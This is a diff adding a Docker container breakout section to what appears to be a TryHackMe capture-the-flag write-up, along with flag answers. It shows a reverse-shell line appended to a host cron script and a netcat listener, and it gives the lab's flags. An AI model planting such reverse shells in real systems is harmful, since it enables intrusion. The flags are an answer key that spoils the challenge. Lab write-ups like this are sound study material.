@@ -75,6 +75,13 @@
 9. Running the `hostname` command and getting a weird string is good indicator that this is a container.
 10. Also `cd`ing to `/` and listing the contents `ls -al` we can see `.dockerenv`.
 
+### Docker container breakout:
+1. After enumerating a bit more we found a script inside `/opt/backups` called `backup.sh`.
+2. This might be running as a cron job in the host.
+3. Inserting code for reverse shell inside it: `echo "/bin/bash -c 'bash -i >& /dev/tcp/10.17.47.107/4444 0>&1'" >> backup.sh` and starting a listener using netcat: `nc -lvnp 4444`.
+4. After a min we get the connection, listing the contents we find `flag4.txt`.
+5. Reading that we get the last flag: `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`.
+
 ### Task 1:
 #### What is flag 1?
 1. The answer is `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`.
@@ -86,3 +93,4 @@
 1. The answer is `THM{D1ff3r3nt_3nv1ronments_874112}`.
 
 #### What is flag 4?
+1. The answer is `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`.
